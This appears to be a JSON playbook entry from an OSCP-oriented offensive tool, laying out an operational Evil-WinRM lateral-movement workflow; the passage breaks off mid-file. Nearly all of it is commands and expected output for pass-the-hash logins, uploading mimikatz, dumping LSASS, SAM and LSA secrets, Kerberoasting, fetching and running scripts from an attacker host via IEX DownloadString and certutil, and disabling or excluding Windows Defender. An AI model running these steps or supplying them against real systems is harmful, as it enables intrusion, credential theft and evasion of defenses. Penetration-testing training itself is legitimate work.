{
  "id": "windows-evil-winrm-operational",
  "name": "Evil-WinRM Complete Operational Workflow",
  "description": "Complete operational guide for Evil-WinRM lateral movement including connection, file transfers, tool deployment, and credential exfiltration.\n\nThis chain covers the ENTIRE Evil-WinRM workflow for OSCP lateral movement: connection establishment (password and Pass-the-Hash), environment verification, file upload/download, tool execution, credential exfiltration, and session management. Focus on OPERATIONAL usage in real engagements.\n\nWHY EVIL-WINRM IS PREFERRED FOR OSCP:\n1. Interactive PowerShell shell (not cmd.exe like PSExec)\n2. Built-in file upload/download (no SMB server needed)\n3. No service creation (stealthier than PSExec)\n4. Supports Pass-the-Hash natively (-H flag)\n5. Works over WinRM (port 5985/5986) when SMB blocked\n6. Automatic handling of PS remoting restrictions\n\nCRITICAL SYNTAX: Evil-WinRM requires 'DOMAIN\\user' format for domain accounts. There is NO -d flag for domain (common mistake). Use single quotes to escape backslash in bash.\n\nSUCCESS RATE: Very high (85-90%) IF WinRM is enabled. Most OSCP lab systems have WinRM enabled by default. Failures usually due to:\n1. WinRM not enabled (15% of systems) - fallback to PSExec/WMI\n2. Wrong credential syntax (domain\\user vs user@domain)\n3. Firewall blocking ports 5985/5986\n4. Certificate validation issues (HTTPS WinRM)\n\nLESSON FROM CORP-DCSYNC WRITEUP: 'Evil-WinRM superior to PSExec for lateral movement (no service creation, file transfer built-in). Critical syntax: domain\\user format (NOT -d flag - doesn't exist).'",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - OSCP Track",
    "created": "2025-11-25",
    "updated": "2025-11-25",
    "tags": [
      "OSCP:HIGH",
      "WINDOWS",
      "LATERAL_MOVEMENT",
      "WINRM",
      "FILE_TRANSFER",
      "CREDENTIAL_ACCESS"
    ],
    "category": "lateral-movement",
    "platform": "windows",
    "references": [
      "https://github.com/Hackplayers/evil-winrm",
      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_remote",
      "https://attack.mitre.org/techniques/T1021/006/",
      "https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/"
    ]
  },
  "difficulty": "beginner",
  "time_estimate": "10 minutes (2 min connection, 3 min upload, 3 min execution, 2 min download)",
  "oscp_relevant": true,
  "prerequisites": [
    "Valid domain credentials (password or NTLM hash)",
    "Target system has WinRM enabled (check port 5985 or 5986)",
    "Compromised user has local admin or Remote Management Users membership",
    "Network access to target system",
    "Evil-WinRM installed on attacker system (gem install evil-winrm)"
  ],
  "notes": "This chain focuses on OPERATIONAL Evil-WinRM usage for OSCP lateral movement and post-exploitation. Not theory, but practical workflow.\n\nCRITICAL SUCCESS FACTORS:\n1. Correct credential syntax: 'DOMAIN\\user' (single quotes, backslash separator)\n2. Verify WinRM enabled: nmap -p 5985,5986 <target> before attempting connection\n3. Use absolute paths for file operations (C:\\temp\\file.txt, not relative paths)\n4. Redirect command output to files for large results (mimikatz, whoami /all)\n5. Download evidence files for writeup documentation\n\nCOMMON FAILURES AND SOLUTIONS:\n\n1. Connection Refused / Timeout:\n   - Cause: WinRM not enabled, firewall blocking ports\n   - Solution: Check nmap for ports 5985/5986, try PSExec/WMI instead\n\n2. Authentication Failed:\n   - Cause: Wrong credential format, incorrect password/hash\n   - Solution: Verify syntax (domain\\user), test with crackmapexec first\n\n3. Access Denied After Login:\n   - Cause: User not in Remote Management Users or Administrators\n   - Solution: Verify group membership, try different user\n\n4. Upload/Download Fails:\n   - Cause: Permissions, path doesn't exist, AV blocking\n   - Solution: Use writable directory (C:\\temp, C:\\Users\\Public), check AV logs\n\n5. Certificate Validation Errors (HTTPS WinRM):\n   - Cause: Self-signed cert, hostname mismatch\n   - Solution: Use -S flag for SSL but skip validation\n\nEVIL-WINRM ADVANTAGES OVER ALTERNATIVES:\n\nvs PSExec:\n- No service creation (stealthier)\n- Interactive PowerShell (not cmd.exe)\n- Built-in file transfer (no SMB server)\n- Cleaner process execution\n\nvs WMI:\n- Interactive shell (WMI is non-interactive)\n- Easier file operations\n- PowerShell integration\n\nvs RDP:\n- Command-line based (no GUI needed)\n- Scriptable and automatable\n- Lower bandwidth requirements\n\nvs SSH:\n- Native Windows remoting (not third-party)\n- Better PowerShell integration\n- More common in Windows environments\n\nFILE TRANSFER OPERATIONS:\n\nUpload Files:\n- Syntax: upload <local_path> <remote_path>\n- Example: upload /opt/mimikatz.exe C:\\temp\\mimikatz.exe\n- Supports: Executables, scripts, text files, compressed archives\n- Size limit: Generally no limit, but large files (>100MB) may be slow\n\nDownload Files:\n- Syntax: download <remote_path> <local_path>\n- Example: download C:\\temp\\credentials.txt /tmp/creds.txt\n- Use for: Credential dumps, enumeration results, flags, screenshots\n\nBatch Operations:\n- Upload multiple files: Use menu command or script\n- Download directory: Requires PowerShell copy commands first\n\nCOMMAND EXECUTION PATTERNS:\n\nInteractive Commands:\n- whoami, hostname, ipconfig (immediate output)\n- dir, ls (PowerShell aliases work)\n- Get-* PowerShell cmdlets\n\nLong-Running Commands:\n- Redirect output: mimikatz.exe \"commands\" > output.txt\n- Background execution: Start-Process (for GUI tools)\n- Check running: Get-Process\n\nCredential Harvesting:\n- Upload mimikatz.exe\n- Execute: .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt\n- Download: download C:\\temp\\creds.txt /tmp/creds.txt\n\nTIME ESTIMATES FOR OSCP:\n- Connection establishment: 30 seconds - 2 minutes (depends on network)\n- Environment verification: 1 minute (whoami, hostname, ipconfig)\n- Upload tools (mimikatz ~1.2MB): 30 seconds - 2 minutes\n- Execute credential dump: 2-3 minutes\n- Download results: 30 seconds - 1 minute\n- TOTAL: 5-10 minutes for complete lateral movement + credential harvest\n\nEXAM TIPS:\n- Always test connection with whoami first (verify access)\n- Create C:\\temp directory if it doesn't exist (mkdir C:\\temp)\n- Use absolute paths (C:\\temp\\file.txt, not .\\file.txt)\n- Redirect long output to files (> output.txt)\n- Download ALL evidence for writeup (credentials, flags, enumeration)\n- Document exact commands used (for reproducibility)\n- Keep session active (don't close terminal accidentally)",
  "steps": [
    {
      "id": "verify-winrm-accessible",
      "name": "Verify WinRM Service Accessible",
      "objective": "Confirm target system has WinRM enabled and accessible before attempting connection",
      "description": "Check if target system has WinRM service enabled and ports accessible. This prevents wasted time attempting connections to systems without WinRM.\n\nPort Scan (Quick Check):\n```bash\nnmap -p 5985,5986 <TARGET_IP>\n```\n\nPorts:\n- 5985: HTTP WinRM (default, unencrypted)\n- 5986: HTTPS WinRM (encrypted, requires SSL)\n\nExpected Output (WinRM Enabled):\n```\nPORT     STATE SERVICE\n5985/tcp open  wsman\n5986/tcp open  wsmans\n```\n\nExpected Output (WinRM Disabled):\n```\nPORT     STATE  SERVICE\n5985/tcp closed wsman\n5986/tcp closed wsmans\n```\n\nDetailed Service Detection:\n```bash\nnmap -p 5985,5986 -sV <TARGET_IP>\n```\n\nExpected:\n```\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n```\n\nAlternative: Test with crackmapexec:\n```bash\ncrackmapexec winrm <TARGET_IP> -u <user> -p <password>\n```\n\nExpected (WinRM Enabled):\n```\nWINRM  <TARGET_IP>  5985  <HOSTNAME>  [+] DOMAIN\\user:password (Pwn3d!)\n```\n\nWinRM Status Interpretation:\n- Port 5985 open: WinRM enabled, use evil-winrm normally\n- Port 5986 open: HTTPS WinRM, use evil-winrm with -S flag\n- Both closed: WinRM disabled, use alternative (PSExec, WMI, RDP)\n- Filtered: Firewall blocking, may still work from internal network\n\nChecking from Windows (if you have access to another domain system):\n```powershell\nTest-NetConnection -ComputerName <TARGET> -Port 5985\n```\n\nOR\n```powershell\nTest-WSMan -ComputerName <TARGET>\n```\n\nExpected (WinRM Enabled):\n```\nwsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd\nProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\nProductVendor   : Microsoft Corporation\nProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0\n```\n\nTroubleshooting:\n\n1. Ports Closed:\n   - WinRM may not be enabled on target\n   - Check if target is Windows Server (more likely to have WinRM)\n   - Try alternative lateral movement (PSExec, WMI)\n\n2. Ports Filtered:\n   - Firewall blocking external access\n   - Try from pivot point inside network\n   - Check if you're on correct network segment\n\n3. Connection Timeout:\n   - Target may be offline (ping first)\n   - Network routing issues\n   - Check VPN/tunnel status\n\nWinRM Enabling (if you have admin access via another method):\n```powershell\n# From target system (via PSExec or RDP):\nEnable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '*' -Force\nRestart-Service WinRM\n```\n\nFirewall Rule (if needed):\n```powershell\nNew-NetFirewallRule -Name \"WinRM-HTTP\" -DisplayName \"WinRM HTTP\" -Enabled True -Direction Inbound -Protocol TCP -LocalPort 5985\n```\n\nVerification Summary:\n- ✓ Port 5985 or 5986 open\n- ✓ Service responds to nmap scan\n- ✓ crackmapexec confirms WinRM accessibility\n- ✓ Target system online and accessible\n\nIf WinRM NOT available:\n- Use PSExec: impacket-psexec <domain>/<user>:<password>@<target>\n- Use WMI: impacket-wmiexec <domain>/<user>:<password>@<target>\n- Use RDP: xfreerdp /u:<user> /p:<password> /v:<target>\n- Use SMB exec: impacket-smbexec <domain>/<user>:<password>@<target>",
      "command_ref": null,
      "evidence": [
        "Nmap output showing ports 5985/5986 open",
        "Service version detection confirming HTTPAPI/WSMAN",
        "Crackmapexec validation (optional)",
        "Target confirmed online and accessible"
      ],
      "dependencies": [],
      "repeatable": true,
      "success_criteria": [
        "Port 5985 or 5986 open on target",
        "Service responds to port scan",
        "Target system online and reachable",
        "Ready to attempt Evil-WinRM connection"
      ],
      "failure_conditions": [
        "Ports closed: WinRM not enabled, use alternative lateral movement",
        "Ports filtered: Firewall blocking, try from internal pivot",
        "Target offline: Verify system is online (ping, check IP)"
      ],
      "next_steps": ["establish-connection"]
    },
    {
      "id": "establish-connection",
      "name": "Establish Evil-WinRM Connection",
      "objective": "Connect to target system using Evil-WinRM with password or Pass-the-Hash",
      "description": "Establish interactive PowerShell session on target system using Evil-WinRM. Supports both password and Pass-the-Hash authentication.\n\nConnection Method 1: Password Authentication\n```bash\nevil-winrm -i <TARGET_IP> -u '<DOMAIN>\\<USERNAME>' -p '<PASSWORD>'\n```\n\nExample:\n```bash\nevil-winrm -i 10.10.10.75 -u 'CORP\\mike' -p 'Password123!'\n```\n\nConnection Method 2: Pass-the-Hash\n```bash\nevil-winrm -i <TARGET_IP> -u '<DOMAIN>\\<USERNAME>' -H <NTLM_HASH>\n```\n\nExample:\n```bash\nevil-winrm -i 10.10.10.75 -u 'CORP\\administrator' -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n```\n\nConnection Method 3: HTTPS/SSL WinRM (Port 5986)\n```bash\nevil-winrm -i <TARGET_IP> -u '<DOMAIN>\\<USERNAME>' -p '<PASSWORD>' -S\n```\n\nConnection Method 4: Local Account (Non-Domain)\n```bash\nevil-winrm -i <TARGET_IP> -u '<USERNAME>' -p '<PASSWORD>'\n```\n\nNote: No domain prefix for local accounts.\n\nCRITICAL SYNTAX RULES:\n\n1. Domain Format:\n   - CORRECT: 'DOMAIN\\user' (single quotes, backslash)\n   - WRONG: DOMAIN/user (forward slash doesn't work)\n   - WRONG: -d DOMAIN -u user (no -d flag in evil-winrm)\n   - WRONG: user@DOMAIN (UPN format not supported)\n\n2. Quoting:\n   - Single quotes REQUIRED for 'DOMAIN\\user' (escapes backslash in bash)\n   - Password with special chars: Single quotes recommended\n   - Example: -p 'P@ssw0rd!'\n\n3. Hash Format:\n   - NTLM hash: 32 hexadecimal characters\n   - No colons or prefixes (just the hash)\n   - Example: -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\nExpected Output (Success):\n```\nEvil-WinRM shell v3.4\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\mike\\Documents>\n```\n\nKey Indicators:\n- \"Establishing connection to remote endpoint\" message\n- PowerShell prompt appears: *Evil-WinRM* PS C:\\...\n- No error messages\n\nExpected Output (Failed Authentication):\n```\nError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError\n\nError: Exiting with code 1\n```\n\nCauses:\n- Wrong password/hash\n- Wrong domain name\n- User doesn't exist\n- Account locked/disabled\n\nExpected Output (Connection Refused):\n```\nError: An error of type Errno::ECONNREFUSED happened, message is Connection refused - connect(2)\n```\n\nCauses:\n- WinRM not enabled (check step 1)\n- Wrong IP address\n- Target offline\n- Firewall blocking\n\nConnection Options:\n\n-i <IP>        : Target IP or hostname\n-u <USER>      : Username (with domain prefix for domain accounts)\n-p <PASSWORD>  : Password\n-H <HASH>      : NTLM hash (Pass-the-Hash)\n-S             : Enable SSL (for port 5986)\n-P <PORT>      : Custom port (default: 5985)\n-s <SCRIPT>    : Execute PowerShell script on connect\n\nVerification After Connection:\n```powershell\nwhoami\n```\nExpected: DOMAIN\\username\n\n```powershell\nhostname\n```\nExpected: Target system name\n\n```powershell\nwhoami /groups\n```\nCheck for: BUILTIN\\Administrators (confirms local admin)\n\nTroubleshooting:\n\n1. \"WinRMAuthorizationError\":\n   - Test credentials first: crackmapexec smb <target> -u <user> -p <password>\n   - Verify domain name: May be NetBIOS vs FQDN issue\n   - Check account status: net user <username> /domain\n\n2. \"Connection refused\":\n   - Verify WinRM enabled (step 1)\n   - Check IP address (ping target)\n   - Try alternative port (-P 5986 with -S)\n\n3. \"SSL Certificate Verification Failed\":\n   - Use -S flag but don't validate cert\n   - Self-signed cert is normal in labs\n\n4. \"Timeout\":\n   - Network routing issue\n   - Firewall blocking\n   - Target offline\n\n5. Syntax errors:\n   - Verify quotes: 'DOMAIN\\user' (single quotes)\n   - No -d flag (common mistake from other tools)\n   - Backslash not forward slash\n\nAlternative Connection Methods (if Evil-WinRM fails):\n- PSExec: impacket-psexec CORP/user:password@<target>\n- WMI: impacket-wmiexec CORP/user:password@<target>\n- SMBExec: impacket-smbexec CORP/user:password@<target>",
      "command_ref": "evil-winrm-connect",
      "evidence": [
        "Evil-WinRM prompt appears (*Evil-WinRM* PS)",
        "whoami output shows domain\\username",
        "hostname confirms target system",
        "Interactive PowerShell session established"
      ],
      "dependencies": ["verify-winrm-accessible"],
      "repeatable": true,
      "success_criteria": [
        "Evil-WinRM prompt displayed",
        "whoami confirms correct user",
        "hostname confirms correct system",
        "Commands execute without errors"
      ],
      "failure_conditions": [
        "Authentication failed: Verify credentials with crackmapexec",
        "Connection refused: Check WinRM status from step 1",
        "Timeout: Check network routing and firewall",
        "Syntax error: Verify 'DOMAIN\\user' format with single quotes"
      ],
      "next_steps": ["verify-environment"]
    },
    {
      "id": "verify-environment",
      "name": "Verify Environment and Privileges",
      "objective": "Verify you're on the correct system with expected privileges before proceeding with operations",
      "description": "Verify connection details, system information, and privilege level before proceeding with file operations or credential harvesting.\n\nVerification Commands:\n\n1. Confirm User Identity:\n```powershell\nwhoami\n```\nExpected: DOMAIN\\username (or HOSTNAME\\username for local)\nVerifies: You're logged in as intended user\n\n2. Confirm System Hostname:\n```powershell\nhostname\n```\nExpected: Target system name (CLIENT75, DC01, etc.)\nVerifies: You're on correct system (not wrong IP)\n\n3. Check User Groups:\n```powershell\nwhoami /groups\n```\nLook for:\n- BUILTIN\\Administrators (confirms local admin)\n- DOMAIN\\Domain Admins (confirms DA privileges)\n- BUILTIN\\Remote Management Users (confirms WinRM access)\n\nExpected Output (Local Admin):\n```\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type\n====================================== ====\nBUILTIN\\Administrators                 Alias\nBUILTIN\\Users                          Alias\nNT AUTHORITY\\INTERACTIVE               Well-known group\n...\n```\n\n4. Check User Privileges:\n```powershell\nwhoami /priv\n```\nLook for:\n- SeDebugPrivilege (needed for mimikatz)\n- SeImpersonatePrivilege (needed for privilege escalation)\n- SeBackupPrivilege (needed for file access)\n\nExpected Output (Admin User):\n```\nPRIVILEGE INFORMATION\n---------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== =======\nSeDebugPrivilege              Debug programs                       Disabled\nSeBackupPrivilege             Back up files and directories        Disabled\nSeRestorePrivilege            Restore files and directories        Disabled\n...\n```\n\nNote: \"Disabled\" is normal - privileges can be enabled when needed.\n\n5. System Information:\n```powershell\nsysteminfo\n```\nKey fields:\n- OS Name: Windows Server 2019, Windows 10, etc.\n- OS Version: Build number\n- Domain: Confirms domain membership\n- Logon Server: Shows which DC authenticated you\n\n6. Network Configuration:\n```powershell\nipconfig /all\n```\nVerifies:\n- IP address matches target\n- DNS servers (shows DCs)\n- Domain name\n\n7. Current Directory:\n```powershell\npwd\n```\nExpected: C:\\Users\\<username>\\Documents (default location)\n\nComprehensive Verification:\n```powershell\nWrite-Host \"[*] User Identity: \" -NoNewline; whoami\nWrite-Host \"[*] Hostname: \" -NoNewline; hostname\nWrite-Host \"[*] Domain: \" -NoNewline; (Get-WmiObject Win32_ComputerSystem).Domain\nWrite-Host \"[*] Local Admin: \" -NoNewline; ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\nWrite-Host \"[*] Current Directory: \" -NoNewline; pwd\n```\n\nExpected Output:\n```\n[*] User Identity: CORP\\mike\n[*] Hostname: CLIENT75\n[*] Domain: CORP.LOCAL\n[*] Local Admin: True\n[*] Current Directory: C:\\Users\\mike\\Documents\n```\n\nEnvironment Checks:\n\n1. Writable Directories:\n```powershell\nTest-Path C:\\temp -PathType Container\n```\nIf False: mkdir C:\\temp\n\nAlternative writable locations:\n- C:\\Users\\Public\n- C:\\ProgramData\n- $env:TEMP (user temp directory)\n\n2. PowerShell Version:\n```powershell\n$PSVersionTable\n```\nExpected: PSVersion 5.1 or higher\nRelevant for: PowerShell script compatibility\n\n3. Antivirus Status:\n```powershell\nGet-MpComputerStatus\n```\nKey fields:\n- RealTimeProtectionEnabled: True/False\n- AntivirusEnabled: True/False\n\nIf True: May need AV evasion for mimikatz\n\n4. Windows Defender Exclusions:\n```powershell\nGet-MpPreference | Select-Object -ExpandProperty ExclusionPath\n```\nShows: Directories excluded from AV scanning\n\nDocumentation Template:\n```\n=== ENVIRONMENT VERIFICATION ===\nUser: CORP\\mike\nHostname: CLIENT75\nDomain: CORP.LOCAL\nLocal Admin: Yes\nPrivileges: SeDebugPrivilege, SeImpersonatePrivilege\nOS: Windows Server 2019 (Build 17763)\nAV Status: Windows Defender Enabled\nCurrent Directory: C:\\Users\\mike\\Documents\nWritable: C:\\temp (created)\n```\n\nTroubleshooting:\n\n1. Not Local Admin:\n   - whoami /groups doesn't show BUILTIN\\Administrators\n   - Solution: Verify credentials, may need different user\n\n2. Wrong System:\n   - hostname doesn't match expected target\n   - Solution: Disconnect, verify IP address, reconnect\n\n3. Limited Privileges:\n   - Missing SeDebugPrivilege\n   - Solution: May work for file operations, but mimikatz may fail\n\n4. AV Alerts:\n   - Defender triggering on commands\n   - Solution: Note for later, may need obfuscation",
      "command_ref": null,
      "evidence": [
        "whoami output confirming user identity",
        "hostname confirming correct target system",
        "whoami /groups showing local admin membership",
        "systeminfo output with OS version and domain"
      ],
      "dependencies": ["establish-connection"],
      "repeatable": true,
      "success_criteria": [
        "Confirmed correct user logged in",
        "Confirmed correct target system",
        "Verified local administrator privileges",
        "Identified writable directories",
        "Documented environment details"
      ],
      "failure_conditions": [
        "Wrong system: Disconnect and verify IP address",
        "Not local admin: Credentials may be incorrect or user lacks privileges",
        "No writable directories: Create C:\\temp or use %TEMP%"
      ],
      "next_steps": ["upload-tools"]
    },
    {
      "id": "upload-tools",
      "name": "Upload Tools and Scripts",
      "objective": "Transfer necessary tools (mimikatz, scripts, etc.) to target system for post-exploitation",
      "description": "Use Evil-WinRM's built-in upload functionality to transfer tools to target system. This is MORE CONVENIENT than setting up SMB server.\n\nPreparation:\n1. Navigate to writable directory on target:\n```powershell\ncd C:\\temp\n```\n\nIf directory doesn't exist:\n```powershell\nmkdir C:\\temp\ncd C:\\temp\n```\n\nEvil-WinRM Upload Syntax:\n```\nupload <local_path> <remote_path>\n```\n\nExample: Upload mimikatz\n```\nupload /opt/mimikatz/x64/mimikatz.exe C:\\temp\\mimikatz.exe\n```\n\nExpected Output (Success):\n```\nInfo: Uploading /opt/mimikatz/x64/mimikatz.exe to C:\\temp\\mimikatz.exe\n\nData: 1398016 bytes of 1398016 bytes copied\n\nInfo: Upload successful!\n```\n\nKey Indicators:\n- \"Upload successful!\" message\n- Correct byte count\n- No error messages\n\nVerify Upload:\n```powershell\ndir C:\\temp\\mimikatz.exe\n```\n\nExpected:\n```\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        11/25/2025  10:30 AM        1398016 mimikatz.exe\n```\n\nVerify File Integrity:\n```powershell\nGet-FileHash C:\\temp\\mimikatz.exe -Algorithm MD5\n```\n\nCompare with known good hash of mimikatz.\n\nMultiple File Upload:\n```\n# From Evil-WinRM prompt:\nupload /opt/mimikatz.exe C:\\temp\\mimikatz.exe\nupload /opt/PowerUp.ps1 C:\\temp\\PowerUp.ps1\nupload /opt/Invoke-Kerberoast.ps1 C:\\temp\\Invoke-Kerberoast.ps1\n```\n\nUpload to Different Locations:\n```\nupload /opt/tool.exe C:\\Users\\Public\\tool.exe\nupload /opt/script.ps1 C:\\ProgramData\\script.ps1\n```\n\nCommon Tools to Upload:\n\n1. Credential Harvesting:\n   - mimikatz.exe (credential dumping)\n   - Invoke-Mimikatz.ps1 (in-memory mimikatz)\n   - pypykatz (Python alternative)\n\n2. Enumeration:\n   - PowerUp.ps1 (privilege escalation checks)\n   - Sherlock.ps1 (missing patches)\n   - BloodHound.ps1 (AD enumeration)\n\n3. Persistence:\n   - nc.exe (netcat for reverse shells)\n   - meterpreter payload\n\n4. Exploitation:\n   - exploits.exe (privilege escalation exploits)\n   - Invoke-Kerberoast.ps1 (Kerberoasting)\n\nAlternative Upload Methods (if evil-winrm upload fails):\n\n1. PowerShell Download:\n```powershell\nIWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\\temp\\mimikatz.exe\n```\n\nRequires: HTTP server on attacker (python3 -m http.server 80)\n\n2. SMB Copy:\n```powershell\ncopy \\\\<ATTACKER_IP>\\share\\mimikatz.exe C:\\temp\\mimikatz.exe\n```\n\nRequires: SMB server on attacker (impacket-smbserver share /opt -smb2support)\n\n3. Certutil:\n```powershell\ncertutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\\temp\\mimikatz.exe\n```\n\n4. Base64 Encoding (for small files):\nAttacker:\n```bash\nbase64 -w 0 script.ps1 > script.b64\n```\n\nTarget:\n```powershell\n[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"<BASE64_STRING>\")) | Out-File C:\\temp\\script.ps1\n```\n\nAntivirus Evasion:\n\n1. Rename Files:\n```\nupload /opt/mimikatz.exe C:\\temp\\update.exe\n```\n\n2. Add to Exclusions (if admin):\n```powershell\nAdd-MpPreference -ExclusionPath C:\\temp\n```\n\n3. Disable AV Temporarily:\n```powershell\nSet-MpPreference -DisableRealtimeMonitoring $true\n```\n\nNote: Requires admin, may trigger alerts.\n\n4. Use Obfuscated Versions:\n- Upload obfuscated mimikatz\n- Use Invoke-Mimikatz (PowerShell, in-memory)\n- Use pypykatz (Python, less detected)\n\nTroubleshooting:\n\n1. Upload Fails:\n   - Check permissions: mkdir C:\\temp as admin\n   - Try alternative location: C:\\Users\\Public\n   - Use alternative method: PowerShell IWR\n\n2. File Deleted Immediately:\n   - Antivirus quarantined file\n   - Check: Get-MpThreatDetection\n   - Solution: Add exclusion, use obfuscated version\n\n3. Partial Upload:\n   - Network interruption\n   - Solution: Re-upload, verify file size\n\n4. Wrong File Size:\n   - Corrupted transfer\n   - Solution: Re-upload, verify hash\n\n5. Permission Denied:\n   - Not local admin\n   - Solution: Verify privileges, try different directory",
      "command_ref": "evil-winrm-upload-file",
      "evidence": [
        "Upload successful message from Evil-WinRM",
        "File exists on target (dir command)",
        "Correct file size",
        "File hash matches original (optional)"
      ],
      "dependencies": ["verify-environment"],
      "repeatable": true,
      "success_criteria": [
        "Tools uploaded successfully",
        "Files present in target directory",
        "File sizes correct",
        "No AV quarantine",
        "Tools execute without errors"
      ],
      "failure_conditions": [
        "Upload fails: Check permissions, try different directory",
        "AV deletes files: Add exclusions or use obfuscated versions",
        "File corrupted: Re-upload and verify hash"
      ],
      "next_steps": ["execute-operations"]
    },
    {
      "id": "execute-operations",
      "name": "Execute Tools and Collect Results",
      "objective": "Execute uploaded tools, capture output, and collect results for exfiltration",
      "description": "Execute tools on target system and redirect output to files for later download. Focus on credential harvesting and enumeration.\n\nCredential Harvesting Workflow:\n\n1. Execute Mimikatz:\n```powershell\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > credentials.txt\n```\n\nExecution time: 2-10 seconds\nOutput file: credentials.txt (~50-200 lines)\n\n2. Verify Execution:\n```powershell\ndir credentials.txt\n```\n\nExpected: File exists with size > 0 bytes\n\n3. Preview Output:\n```powershell\nGet-Content credentials.txt -Head 50\n```\n\nLook for: \"Privilege '20' OK\" (confirms success)\n\nAlternative Commands:\n\nMimikatz Kerberos Tickets:\n```powershell\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"\n```\n\nCreates: .kirbi files in current directory\n\nMimikatz LSA Secrets:\n```powershell\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::secrets\" \"exit\" > secrets.txt\n```\n\nMimikatz SAM Dump:\n```powershell\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\" > sam.txt\n```\n\nPowerShell-Based Credential Harvesting:\n\n1. Invoke-Mimikatz (In-Memory):\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"' > creds.txt\n```\n\n2. PowerUp (Privilege Escalation Checks):\n```powershell\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks > privesc.txt\n```\n\n3. Kerberoasting:\n```powershell\nImport-Module .\\Invoke-Kerberoast.ps1\nInvoke-Kerberoast -OutputFormat Hashcat > kerberoast.txt\n```\n\nEnumeration Commands:\n\n1. Domain Users:\n```powershell\nnet user /domain > domain_users.txt\n```\n\n2. Domain Admins:\n```powershell\nnet group \"Domain Admins\" /domain > domain_admins.txt\n```\n\n3. Domain Computers:\n```powershell\nnet group \"Domain Computers\" /domain > domain_computers.txt\n```\n\n4. Local Users:\n```powershell\nnet user > local_users.txt\n```\n\n5. Running Processes:\n```powershell\nGet-Process > processes.txt\n```\n\n6. Installed Software:\n```powershell\nGet-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* > software.txt\n```\n\n7. Scheduled Tasks:\n```powershell\nschtasks /query /fo LIST /v > scheduled_tasks.txt\n```\n\n8. Network Connections:\n```powershell\nnetstat -ano > network.txt\n```\n\n9. Shares:\n```powershell\nnet share > shares.txt\n```\n\n10. Firewall Rules:\n```powershell\nnetsh advfirewall show allprofiles > firewall.txt\n```\n\nFlag Retrieval:\n\n1. User Flag:\n```powershell\ntype C:\\Users\\<username>\\Desktop\\user.txt\n```\n\n2. Root/Admin Flag (if DA):\n```powershell\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\n```\n\nOR\n```powershell\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n```\n\n3. Search for Flags:\n```powershell\nGet-ChildItem -Path C:\\ -Include *.txt,*.xml -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match \"flag|proof|user|root\"}\n```\n\nLong-Running Commands:\n\nFor commands that take time (>10 seconds):\n```powershell\nStart-Job -ScriptBlock {command} > output.txt\n```\n\nCheck status:\n```powershell\nGet-Job\n```\n\nGet results:\n```powershell\nReceive-Job -Id 1\n```\n\nOutput Management:\n\n1. Redirect to Files:\n```powershell\ncommand > output.txt      # Overwrite\ncommand >> output.txt     # Append\ncommand 2>&1 > output.txt # Include errors\n```\n\n2. Copy to Clipboard (for small output):\n```powershell\nwhoami /all | clip\n```\n\n3. Format Output:\n```powershell\nGet-Process | Format-Table -AutoSize > processes.txt\n```\n\nTroubleshooting:\n\n1. Command Hangs:\n   - Press Ctrl+C to abort\n   - Use timeout: timeout /t 30 command\n   - Run in background: Start-Job\n\n2. Output Too Large:\n   - Limit results: Select-Object -First 100\n   - Filter: Where-Object {condition}\n   - Compress: Compress-Archive -Path C:\\temp\\*.txt -DestinationPath C:\\temp\\results.zip\n\n3. Execution Policy Blocked:\n```powershell\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force\n```\n\n4. Mimikatz Fails:\n   - Check privilege::debug output: \"Privilege '20' OK\"\n   - Try alternative: Invoke-Mimikatz\n   - Check AV: Get-MpComputerStatus\n\n5. File Not Created:\n   - Check permissions: Test-Path C:\\temp\\output.txt\n   - Verify command completed: Check for errors\n   - Try different location: %TEMP%",
      "command_ref": null,
      "evidence": [
        "Output files created (credentials.txt, etc.)",
        "Mimikatz privilege::debug successful",
        "Enumeration results captured",
        "Flags retrieved (if applicable)"
      ],
      "dependencies": ["upload-tools"],
      "repeatable": true,
      "success_criteria": [
        "Tools execute without errors",
        "Output captured to files",
        "Credentials extracted (if present)",
        "Flags retrieved (if applicable)",
        "Enumeration data collected"
      ],
      "failure_conditions": [
        "Privilege::debug fails: Not local admin or UAC blocking",
        "No credentials found: System recently rebooted",
        "AV blocks execution: Use obfuscated tools or disable AV",
        "Command hangs: Timeout or run in background"
      ],
      "next_steps": ["download-results"]
    },
    {
